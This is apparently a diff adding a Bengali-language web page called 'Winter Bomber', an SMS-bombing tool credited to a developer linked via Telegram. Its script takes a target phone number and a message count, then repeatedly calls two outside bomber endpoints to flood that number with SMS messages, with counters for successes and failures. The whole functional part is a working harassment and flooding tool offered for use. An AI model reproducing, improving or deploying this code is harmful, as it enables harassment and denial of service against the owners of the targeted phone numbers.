@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>শীতকালীন বোম্বার</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d, #1abc9c, #3498db);
+            background-size: 400% 400%;
+            animation: gradientAnimation 10s ease infinite;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            max-width: 600px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
+        }
+
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            color: white;
+            text-shadow: 0 0 10px white;
+        }
+
+        .input-container {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 1em;
+            border: 1px solid white;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px white;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1.2em;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background: white;
+            color: black;
+            transition: transform 0.3s, background 0.3s;
+        }
+
+        button:hover {
+            background: #fdbb2d;
+            transform: scale(1.05);
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            color: white;
+            font-size: 0.9em;
+        }
+
+        .footer a {
+            color: #fdbb2d;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>শীতকালীন বোম্বার</h1>
+        <div class="input-container">
+            <input type="text" id="number" placeholder="ফোন নম্বর দিন (017XXXXXXXX)" required>
+        </div>
+        <div class="input-container">
+            <input type="number" id="amount" placeholder="মোট SMS সংখ্যা দিন" required>
+        </div>
+        <button onclick="startBomber()">শুরু করুন</button>
+        <div id="status"></div>
+    </div>
+
+    <div class="footer">
+        Developed by <a href="https://t.me/Hafiz_Siam_Ahmed" target="_blank">𝙎𝙞𝙖𝙢 ᥫ᭡፝֟፝֟</a> | Join our <a href="https://t.me/Premium_Apk_1" target="_blank">Telegram</a>
+    </div>
+
+    <!-- স্নোফ্লেক স্ক্রিপ্ট -->
+    <script>
+        const createSnowflake = () => {
+            const snowflake = document.createElement('div');
+            snowflake.classList.add('snowflake');
+            snowflake.textContent = '❄';
+            snowflake.style.left = Math.random() * window.innerWidth + 'px';
+            snowflake.style.fontSize = Math.random() * 10 + 10 + 'px';
+            document.body.appendChild(snowflake);
+
+            setTimeout(() => {
+                snowflake.remove();
+            }, 10000);
+        };
+
+        setInterval(createSnowflake, 100);
+
+        const apis = [
+            async function api1(phone) {
+                const response = await fetch(`https://bdtools.top/smsbomapi.php?uid=6725a46fdace3tmx&number=${phone}`);
+                return response.ok;
+            },
+            async function api2(phone) {
+                const response = await fetch(`https://sasabbir.xyz/sms_bomber.php?mobile=${phone}`);
+                return response.ok;
+            }
+        ];
+
+        async function startBomber() {
+            const number = document.getElementById('number').value;
+            const amount = parseInt(document.getElementById('amount').value);
+            const statusDiv = document.getElementById('status');
+
+            if (!number || !amount) {
+                statusDiv.innerHTML = "<p style='color:red;'>দয়া করে সব তথ্য পূরণ করুন।</p>";
+                return;
+            }
+
+            statusDiv.innerHTML = "<p style='color:yellow;'>SMS পাঠানো শুরু হয়েছে...</p>";
+
+            let success = 0, failure = 0;
+
+            for (let i = 0; i < amount; i++) {
+                const api = apis[i % apis.length];
+                try {
+                    const result = await api(number);
+                    if (result) success++;
+                    else failure++;
+                } catch {
+                    failure++;
+                }
+                statusDiv.innerHTML = `<p style="color:white;">সফল: ${success}, ব্যর্থ: ${failure}</p>`;
+            }
+
+            statusDiv.innerHTML += "<p style='color:green;'>SMS প্রক্রিয়া সম্পন্ন হয়েছে।</p>";
+        }
+    </script>
+</body>
+</html>
